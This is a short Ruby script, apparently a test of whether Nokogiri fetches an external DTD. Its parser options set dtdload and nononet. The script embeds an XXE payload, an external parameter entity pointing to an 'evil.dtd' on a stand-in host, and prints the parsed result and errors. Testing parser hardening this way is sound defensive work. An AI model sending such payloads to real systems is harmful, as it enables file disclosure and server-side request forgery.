require 'nokogiri'
require 'yaml'

puts Nokogiri::VERSION_INFO.to_yaml

xml = <<-EOX
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://0.0.0.0:8080/evil.dtd"> %remote;]>
EOX

# doc = Nokogiri::XML(xml)
doc = Nokogiri::XML(xml) do |config|
  config.dtdload.nononet
end
puts "--- xml: ---"
puts doc.to_xml
puts "--- errors: ---"
puts doc.errors